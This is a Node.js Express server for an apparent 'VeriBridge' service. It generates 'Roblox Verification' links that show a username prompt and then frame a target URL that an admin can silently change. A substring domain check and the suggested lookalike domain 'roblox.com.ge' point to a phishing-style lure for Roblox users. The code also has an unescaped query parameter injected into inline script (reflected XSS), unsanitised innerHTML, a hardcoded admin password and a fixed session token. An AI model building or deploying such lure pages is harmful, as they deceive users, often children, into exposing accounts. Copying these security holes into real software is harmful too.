const express = require('express');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const path = require('path');

const app = express();

// ==================== CONFIGURATION ====================
const ADMIN_PASSWORD = 'YourStrongPassword123';
const SESSION_SECRET = 'veribridge-secret-2024';

// ==================== ALLOWED DOMAINS ====================
const SETTINGS_FILE = path.join(__dirname, '..', 'settings.json');
let ALLOWED_DOMAINS = ['roblox.com', 'www.roblox.com', 'web.roblox.com', 'api.roblox.com'];

function loadSettings() {
    try {
        if (fs.existsSync(SETTINGS_FILE)) {
            const data = JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'));
            if (data.allowedDomains) ALLOWED_DOMAINS = data.allowedDomains;
        }
    } catch (err) {}
}
loadSettings();

function saveSettings() {
    try {
        fs.writeFileSync(SETTINGS_FILE, JSON.stringify({ allowedDomains: ALLOWED_DOMAINS }, null, 2));
    } catch (err) {}
}

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());
app.use(cookieParser());

// ==================== DATA STORAGE ====================
let links = new Map();
let nextId = 1;

function generateCode() {
    return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
}

function isAuthenticated(req, res, next) {
    const token = req.cookies.admin_token;
    if (token === SESSION_SECRET) return next();
    res.status(401).json({ error: 'Unauthorized' });
}

// ==================== PUBLIC API ====================
app.get('/health', (req, res) => {
    res.json({ status: 'ok', linksCount: links.size });
});

app.get('/api/allowed-domains', (req, res) => {
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.post('/api/generate', (req, res) => {
    const { url } = req.body;
    if (!url) return res.status(400).json({ error: 'No URL provided' });
    
    let allowed = false;
    for (const domain of ALLOWED_DOMAINS) {
        if (url.includes(domain)) { allowed = true; break; }
    }
    if (!allowed) {
        return res.status(400).json({ error: 'Domain not allowed. Allowed: ' + ALLOWED_DOMAINS.join(', ') });
    }
    
    const code = generateCode();
    links.set(code, { id: nextId++, code: code, targetUrl: url, createdAt: Date.now(), clicks: 0 });
    const shareableLink = 'https://' + req.headers.host + '/verify.html?code=' + code;
    res.json({ success: true, shareableLink: shareableLink, code: code });
});

app.get('/api/link/:code', (req, res) => {
    const link = links.get(req.params.code);
    if (!link) return res.status(404).json({ error: 'Link not found' });
    link.clicks++;
    res.json({ success: true, targetUrl: link.targetUrl });
});

// ==================== ADMIN API ====================
app.get('/admin/api/links', isAuthenticated, (req, res) => {
    const allLinks = Array.from(links.values()).sort((a, b) => b.createdAt - a.createdAt);
    res.json({ success: true, links: allLinks });
});

app.put('/admin/api/links/:code', isAuthenticated, (req, res) => {
    const link = links.get(req.params.code);
    if (link) {
        link.targetUrl = req.body.targetUrl;
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

app.delete('/admin/api/links/:code', isAuthenticated, (req, res) => {
    links.delete(req.params.code);
    res.json({ success: true });
});

app.get('/admin/api/stats', isAuthenticated, (req, res) => {
    const allLinks = Array.from(links.values());
    const totalClicks = allLinks.reduce(function(s, l) { return s + (l.clicks || 0); }, 0);
    res.json({ success: true, stats: { totalLinks: links.size, totalClicks: totalClicks, averageClicks: links.size ? (totalClicks / links.size).toFixed(2) : 0 } });
});

app.get('/admin/api/domains', isAuthenticated, (req, res) => {
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.post('/admin/api/domains', isAuthenticated, (req, res) => {
    var domain = req.body.domain;
    if (!domain) return res.status(400).json({ error: 'No domain provided' });
    domain = domain.toLowerCase().trim();
    if (ALLOWED_DOMAINS.indexOf(domain) !== -1) {
        return res.status(400).json({ error: 'Domain already exists' });
    }
    ALLOWED_DOMAINS.push(domain);
    saveSettings();
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.delete('/admin/api/domains/:domain', isAuthenticated, (req, res) => {
    var domain = req.params.domain;
    var index = ALLOWED_DOMAINS.indexOf(domain);
    if (index === -1) return res.status(404).json({ error: 'Domain not found' });
    ALLOWED_DOMAINS.splice(index, 1);
    saveSettings();
    res.json({ success: true, domains: ALLOWED_DOMAINS });
});

app.post('/admin/api/login', (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie('admin_token', SESSION_SECRET, { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000, path: '/' });
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

app.post('/admin/api/logout', (req, res) => {
    res.clearCookie('admin_token', { path: '/' });
    res.json({ success: true });
});

// ==================== ADMIN PAGE ====================
app.get('/admin', (req, res) => {
    res.send('<!DOCTYPE html><html><head><title>Admin Login</title><style>body{background:linear-gradient(135deg,#0a0f1e,#0a1a2f,#0b2b3b);font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:rgba(0,0,0,0.5);padding:40px;border-radius:20px;border:1px solid cyan;width:350px}h1{color:white;text-align:center}input{width:100%;padding:12px;margin:10px 0;background:#1a1a2e;border:1px solid cyan;border-radius:10px;color:white}button{width:100%;padding:12px;background:cyan;color:black;border:none;border-radius:10px;font-weight:bold;cursor:pointer}.error{color:red;text-align:center}</style></head><body><div class="login-box"><h1>Admin Login</h1><input type="password" id="password" placeholder="Enter password"><button onclick="login()">Login</button><div id="error" class="error"></div></div><script>async function login(){var pwd=document.getElementById("password").value;var res=await fetch("/admin/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({password:pwd})});var data=await res.json();if(data.success){window.location.href="/admin/dashboard"}else{document.getElementById("error").innerText="Invalid password"}}</script></body></html>');
});

app.get('/admin/dashboard', isAuthenticated, (req, res) => {
    res.send('<!DOCTYPE html><html><head><title>Admin Dashboard</title><style>body{background:#0a0f1e;color:white;font-family:Arial;padding:20px}.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px}h1{color:#00ffff}.logout-btn{background:#ff5555;border:none;padding:10px 20px;border-radius:10px;color:white;cursor:pointer}.tabs{display:flex;gap:10px;margin-bottom:30px;border-bottom:1px solid rgba(0,255,255,0.2);padding-bottom:10px}.tab-btn{background:transparent;border:none;padding:10px 20px;color:#9ab3cc;cursor:pointer;border-radius:8px}.tab-btn:hover{background:rgba(0,255,255,0.1);color:#00ffff}.tab-btn.active{background:rgba(0,255,255,0.2);color:#00ffff}.tab-content{display:none}.tab-content.active{display:block}.stats{display:flex;gap:20px;margin-bottom:30px}.stat-card{background:rgba(0,0,0,0.3);border:1px solid cyan;border-radius:15px;padding:20px;text-align:center;flex:1}.stat-number{font-size:36px;font-weight:bold;color:#00ffff}.search-box{margin-bottom:20px}.search-box input{width:100%;padding:12px;background:#1a1a2e;border:1px solid cyan;border-radius:10px;color:white}table{width:100%;border-collapse:collapse;background:rgba(0,0,0,0.3);border-radius:15px;overflow:hidden}th,td{padding:12px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.1)}th{background:rgba(0,255,255,0.1);color:#00ffff}.edit-btn{background:#2c5a7a;border:none;padding:5px 10px;border-radius:5px;color:white;cursor:pointer}.delete-btn{background:#ff5555;border:none;padding:5px 10px;border-radius:5px;color:white;cursor:pointer}.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);justify-content:center;align-items:center}.modal-content{background:#1a1a2e;padding:30px;border-radius:20px;width:400px;border:1px solid cyan}.modal-content input{width:100%;padding:10px;margin:10px 0;background:#333;border:1px solid cyan;border-radius:10px;color:white}.save-btn{background:#00aa00;border:none;padding:10px;border-radius:10px;color:white;cursor:pointer}.cancel-btn{background:#555;border:none;padding:10px;border-radius:10px;color:white;cursor:pointer}.domains-list{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:20px}.domain-tag{background:rgba(0,255,255,0.2);border:1px solid cyan;padding:8px 15px;border-radius:20px;display:flex;align-items:center;gap:10px}.domain-tag button{background:#ff5555;border:none;color:white;border-radius:50%;width:20px;height:20px;cursor:pointer}.add-domain{display:flex;gap:10px;margin-top:20px}.add-domain input{flex:1;padding:10px;background:#1a1a2e;border:1px solid cyan;border-radius:10px;color:white}.add-domain button{background:#00aa00;border:none;padding:10px 20px;border-radius:10px;color:white;cursor:pointer}</style></head><body><div class="header"><h1>Admin Dashboard</h1><button class="logout-btn" onclick="logout()">Logout</button></div><div class="tabs"><button class="tab-btn active" onclick="switchTab(\'links\')">Manage Links</button><button class="tab-btn" onclick="switchTab(\'domains\')">Allowed Domains</button></div><div id="linksTab" class="tab-content active"><div class="stats"><div class="stat-card"><div class="stat-number" id="totalLinks">0</div><div>Total Links</div></div><div class="stat-card"><div class="stat-number" id="totalClicks">0</div><div>Total Clicks</div></div></div><div class="search-box"><input type="text" id="search" placeholder="Search by URL or code..."></div><div style="overflow-x:auto"><table><thead><tr><th>Code</th><th>URL</th><th>Clicks</th><th>Created</th><th>Actions</th></tr></thead><tbody id="tableBody"></tbody></table></div></div><div id="domainsTab" class="tab-content"><h3>Allowed Domains</h3><p style="margin-bottom:15px;color:#9ab3cc">Add domains that users can shorten.</p><div id="domainsList" class="domains-list">Loading...</div><div class="add-domain"><input type="text" id="newDomain" placeholder="Enter domain (e.g., roblox.com.ge)"><button onclick="addDomain()">Add Domain</button></div></div><div id="editModal" class="modal"><div class="modal-content"><h3>Edit Link</h3><input type="text" id="editCode" readonly><input type="text" id="editUrl" placeholder="New URL"><button class="save-btn" onclick="saveEdit()">Save</button><button class="cancel-btn" onclick="closeModal()">Cancel</button></div></div><script>var currentLinks=[],currentEditCode=null;function switchTab(tab){var btns=document.querySelectorAll(".tab-btn"),contents=document.querySelectorAll(".tab-content");for(var i=0;i<btns.length;i++)btns[i].classList.remove("active");for(var i=0;i<contents.length;i++)contents[i].classList.remove("active");if(tab==="links"){btns[0].classList.add("active");document.getElementById("linksTab").classList.add("active");loadLinks()}else{btns[1].classList.add("active");document.getElementById("domainsTab").classList.add("active");loadDomains()}}async function loadDomains(){try{var res=await fetch("/admin/api/domains");if(res.status===401){window.location.href="/admin";return}var data=await res.json();if(data.success){var container=document.getElementById("domainsList");if(!data.domains||data.domains.length===0){container.innerHTML="<span style=color:#9ab3cc>No domains added.</span>";return}var html="";for(var i=0;i<data.domains.length;i++){html+="<div class=domain-tag>"+data.domains[i]+"<button onclick=removeDomain(\\""+data.domains[i]+"\\")>✕</button></div>"}container.innerHTML=html}}catch(e){console.error(e)}}async function addDomain(){var input=document.getElementById("newDomain");var domain=input.value.trim().toLowerCase();if(!domain){alert("Please enter a domain");return}try{var res=await fetch("/admin/api/domains",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({domain:domain})});var data=await res.json();if(data.success){loadDomains();input.value="";alert("Domain added!")}else{alert(data.error||"Failed to add domain")}}catch(e){alert("Error adding domain")}}async function removeDomain(domain){if(!confirm("Remove "+domain+"?"))return;try{var res=await fetch("/admin/api/domains/"+encodeURIComponent(domain),{method:"DELETE"});var data=await res.json();if(data.success){loadDomains();alert("Domain removed!")}else{alert(data.error||"Failed to remove")}}catch(e){alert("Error")}}async function loadLinks(){var search=document.getElementById("search").value;var url=search?"/admin/api/links?search="+encodeURIComponent(search):"/admin/api/links";var res=await fetch(url);if(res.status===401){window.location.href="/admin";return}var data=await res.json();if(data.success){currentLinks=data.links;document.getElementById("totalLinks").innerText=currentLinks.length;var totalClicks=0;for(var i=0;i<currentLinks.length;i++)totalClicks+=currentLinks[i].clicks||0;document.getElementById("totalClicks").innerText=totalClicks;var tbody=document.getElementById("tableBody");if(currentLinks.length===0){tbody.innerHTML="<tr><td colspan=5 style=text-align:center>No links found</td></tr>";return}var html="";for(var i=0;i<currentLinks.length;i++){var link=currentLinks[i];html+="<tr><td><code>"+link.code+"</code></td><td>"+link.targetUrl+"</td><td>"+(link.clicks||0)+"</td><td>"+new Date(link.createdAt).toLocaleDateString()+"</td><td><button class=edit-btn onclick=openEdit(\\""+link.code+"\\")>Edit</button> <button class=delete-btn onclick=deleteLink(\\""+link.code+"\\")>Delete</button></td></tr>"}tbody.innerHTML=html}}function openEdit(code){var link=null;for(var i=0;i<currentLinks.length;i++){if(currentLinks[i].code===code){link=currentLinks[i];break}}if(link){currentEditCode=code;document.getElementById("editCode").value=code;document.getElementById("editUrl").value=link.targetUrl;document.getElementById("editModal").style.display="flex"}}async function saveEdit(){await fetch("/admin/api/links/"+currentEditCode,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({targetUrl:document.getElementById("editUrl").value})});closeModal();loadLinks()}async function deleteLink(code){if(confirm("Delete this link?")){await fetch("/admin/api/links/"+code,{method:"DELETE"});loadLinks()}}function closeModal(){document.getElementById("editModal").style.display="none"}async function logout(){await fetch("/admin/api/logout",{method:"POST"});window.location.href="/admin"}document.getElementById("search").addEventListener("input",function(){clearTimeout(window.searchTimeout);window.searchTimeout=setTimeout(loadLinks,500)});loadLinks();setInterval(loadLinks,30000);</script></body></html>');
});

// ==================== GENERATOR PAGE ====================
app.get('/gen', (req, res) => {
    res.send('<!DOCTYPE html><html><head><title>VeriBridge Gen</title><script src="https://cdn.tailwindcss.com"></script><style>.shine-text{background:linear-gradient(100deg,#fff 45%,#0ff 50%,#fff 55%);background-size:200% auto;color:transparent;-webkit-background-clip:text;background-clip:text;animation:shine 4s linear infinite}@keyframes shine{0%{background-position:-100% 0}100%{background-position:200% 0}}.loading-spinner{width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block}@keyframes spin{to{transform:rotate(360deg)}}.allowed-domains{background:rgba(0,255,255,0.1);border-radius:8px;padding:10px;margin-top:10px;font-size:11px;color:#0ff}.allowed-domains span{display:inline-block;background:rgba(0,255,255,0.2);padding:2px 8px;border-radius:20px;margin:2px}</style></head><body class="bg-black text-white"><div class="fixed inset-0 -z-10 bg-[radial-gradient(#0d0d0d_1px,transparent_1px)] [background-size:16px_16px]"></div><div class="flex min-h-screen items-center justify-center p-4"><div class="w-full max-w-2xl text-center"><div class="bg-black/40 backdrop-blur-xl border border-cyan-500/30 rounded-2xl p-8"><h1 class="text-3xl font-bold shine-text mb-2">VeriBridge Gen</h1><p class="text-sm text-cyan-400/60 mb-6">Create SHAREABLE verification links (never expire)</p><div class="space-y-4"><input type="text" id="targetUrl" class="w-full bg-zinc-900/80 border border-cyan-500/20 rounded-xl p-3 text-white" placeholder="https://www.roblox.com/login"><button id="generateBtn" class="w-full bg-gradient-to-r from-cyan-600 to-blue-600 py-3 rounded-xl font-semibold hover:from-cyan-500 hover:to-blue-500">Generate Shareable Link</button><div id="allowedDomains" class="allowed-domains"><strong>Allowed Domains:</strong> <span id="domainsList">Loading...</span></div><div id="resultSection" class="hidden mt-4 p-4 bg-cyan-950/40 rounded-xl border border-cyan-500/30"><p class="text-xs text-cyan-300/80 mb-2">Your Shareable Link:</p><code id="resultUrl" class="block bg-black/50 text-cyan-300 text-sm font-mono p-3 rounded-lg break-all cursor-pointer select-all"></code><div class="flex gap-2 mt-3"><button id="copyBtn" class="flex-1 bg-zinc-800 py-2 rounded-lg hover:bg-zinc-700 text-sm">Copy Link</button><button id="testBtn" class="flex-1 bg-cyan-900/50 py-2 rounded-lg hover:bg-cyan-800/50 text-sm">Test</button></div></div><div id="errorMsg" class="text-red-400 text-sm"></div><div class="text-xs text-white/30 pt-4 border-t border-white/10"><p>VALIDATED URLs! Only allowed Roblox domains work</p><p>Links never expire - stored securely</p></div></div></div></div></div><script>var targetUrl=document.getElementById("targetUrl"),generateBtn=document.getElementById("generateBtn"),resultSection=document.getElementById("resultSection"),resultUrl=document.getElementById("resultUrl"),copyBtn=document.getElementById("copyBtn"),testBtn=document.getElementById("testBtn"),errorMsg=document.getElementById("errorMsg"),domainsList=document.getElementById("domainsList");async function loadAllowedDomains(){try{var res=await fetch("/api/allowed-domains"),data=await res.json();if(data.success){var html="";for(var i=0;i<data.domains.length;i++)html+="<span>"+data.domains[i]+"</span>";domainsList.innerHTML=html}}catch(e){domainsList.innerHTML="<span>roblox.com</span><span>www.roblox.com</span>"}}loadAllowedDomains();async function generateLink(){var url=targetUrl.value.trim();if(!url){errorMsg.innerText="Please enter a URL";return}errorMsg.innerText="";generateBtn.disabled=true;generateBtn.innerHTML="<div class=loading-spinner></div> Generating...";try{var response=await fetch("/api/generate",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({url:url})}),data=await response.json();if(data.success){resultUrl.innerText=data.shareableLink;resultSection.classList.remove("hidden")}else{errorMsg.innerText=data.error;resultSection.classList.add("hidden")}}catch(err){errorMsg.innerText="Server error";resultSection.classList.add("hidden")}finally{generateBtn.disabled=false;generateBtn.innerHTML="Generate Shareable Link"}}generateBtn.addEventListener("click",generateLink);copyBtn.addEventListener("click",function(){navigator.clipboard.writeText(resultUrl.innerText)});testBtn.addEventListener("click",function(){window.open(resultUrl.innerText,"_blank")});targetUrl.addEventListener("keypress",function(e){if(e.key==="Enter")generateLink()});setInterval(loadAllowedDomains,30000);</script></body></html>');
});

// ==================== VERIFICATION PAGE ====================
app.get('/verify.html', (req, res) => {
    var code = req.query.code;
    if (!code) {
        res.send('<h1>Invalid link</h1><a href="/gen">Go to Generator</a>');
        return;
    }
    res.send('<!DOCTYPE html><html><head><title>VeriBridge | Verification</title><style>body{background:linear-gradient(135deg,#0a0f1e,#0a1a2f,#0b2b3b);color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{text-align:center;background:rgba(0,0,0,0.3);padding:40px;border-radius:20px;border:1px solid cyan}input,button{padding:12px;margin:10px;border-radius:10px;border:none}input{background:#1a1a2e;color:white;width:250px}button{background:cyan;color:black;font-weight:bold;cursor:pointer}.frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:9999;display:none}.frame-card{width:90%;max-width:500px;background:white;margin:60px auto;border-radius:20px;overflow:hidden}.frame-header{background:#2c5a7a;padding:15px;color:white;display:flex;justify-content:space-between}.close-btn{background:red;color:white;border:none;padding:5px 15px;border-radius:10px;cursor:pointer}iframe{width:100%;height:500px;border:none}</style></head><body><div class="container"><h1>VeriBridge</h1><p>Roblox Verification</p><input type="text" id="username" placeholder="Enter Roblox username"><br><button onclick="startVerification()">Start Verification</button></div><div id="frameOverlay" class="frame-overlay"><div class="frame-card"><div class="frame-header"><span>Verification Required</span><button class="close-btn" onclick="closeFrame()">Close</button></div><iframe id="verificationFrame" src="about:blank"></iframe></div></div><script>var TARGET_URL = "https://www.roblox.com";fetch("/api/link/' + code + '").then(function(res){return res.json();}).then(function(data){if(data.success && data.targetUrl){TARGET_URL = data.targetUrl;console.log("Target URL loaded:", TARGET_URL);}}).catch(function(err){console.error(err);});function startVerification(){var u=document.getElementById("username").value;if(!u||u.length<3){alert("Enter valid username");return}localStorage.setItem("veribridge_user",u);document.getElementById("verificationFrame").src=TARGET_URL;document.getElementById("frameOverlay").style.display="flex"}function closeFrame(){document.getElementById("frameOverlay").style.display="none";document.getElementById("verificationFrame").src="about:blank"}var s=localStorage.getItem("veribridge_user");if(s)document.getElementById("username").value=s;</script></body></html>');
});

// ==================== ROOT REDIRECT ====================
app.get('/', (req, res) => {
    res.redirect('/gen');
});

module.exports = app;
